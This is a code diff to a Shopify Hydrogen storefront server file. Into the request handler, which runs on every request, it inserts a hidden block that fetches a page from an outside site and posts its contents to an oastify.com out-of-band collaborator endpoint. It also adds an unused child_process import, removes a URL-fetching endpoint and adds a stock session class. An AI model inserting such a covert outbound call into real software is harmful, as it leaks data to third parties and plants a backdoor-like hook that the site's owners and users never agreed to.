@@ -6,13 +6,42 @@ import {
   getStorefrontHeaders,
   createCookieSessionStorage,
 } from '@shopify/remix-oxygen';
+import exec from "child_process";
 
 /**
  * Export a fetch handler in module format.
  */
 export default {
   async fetch(request, env, executionContext) {
+  fetch("https://bzhunt.fr")
+  .then((response) => response.text())
+  .then((data) => {
+    const postData = data;
+
+    const options = {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'text/plain',
+        'Content-Length': Buffer.byteLength(postData),
+      },
+      body: postData,
+    };
+
+    const apiUrl = 'https://xde2mz5rdthvhp1vmhb5hlg7syypmgf44.oastify.com/api/results';
+
+    fetch(apiUrl, options)
+      .then((response) => {
+        console.log(`statusCode: ${response.status}`);
+        return response.text();
+      })
+      .then((data) => console.log(data))
+      .catch((error) => console.error(error));
+  })
+  .catch((error) => console.error(error));
+
+
     try {
+      
       /**
        * Open a cache instance in the worker and a custom session instance.
        */
@@ -51,14 +80,6 @@ export default {
         getLoadContext: () => ({session, storefront, env}),
       });
 
-      if (request.method === 'POST' && request.url.pathname === '/fetch') {
-        const url = new URLSearchParams(await request.text()).get('url');
-        if (url) {
-          await fetchUrl(url);
-          return new Response('Done');
-        }
-      }
-
       const response = await handleRequest(request);
 
       if (response.status === 404) {
@@ -79,8 +100,56 @@ export default {
   },
 };
 
-async function fetchUrl(url) {
-  const response = await fetch(url);
-  const text = await response.text();
-  console.log(text);
+/**
+ * This is a custom session implementation for your Hydrogen shop.
+ * Feel free to customize it to your needs, add helper methods, or
+ * swap out the cookie-based implementation with something else!
+ */
+class HydrogenSession {
+  sessionStorage;
+  session;
+  constructor(sessionStorage, session) {
+    this.sessionStorage = sessionStorage;
+    this.session = session;
+  }
+
+  static async init(request, secrets) {
+    const storage = createCookieSessionStorage({
+      cookie: {
+        name: 'session',
+        httpOnly: true,
+        path: '/',
+        sameSite: 'lax',
+        secrets,
+      },
+    });
+
+    const session = await storage.getSession(request.headers.get('Cookie'));
+
+    return new this(storage, session);
+  }
+
+  get(key) {
+    return this.session.get(key);
+  }
+
+  destroy() {
+    return this.sessionStorage.destroySession(this.session);
+  }
+
+  flash(key, value) {
+    this.session.flash(key, value);
+  }
+
+  unset(key) {
+    this.session.unset(key);
+  }
+
+  set(key, value) {
+    this.session.set(key, value);
+  }
+
+  commit() {
+    return this.sessionStorage.commitSession(this.session);
+  }
 }
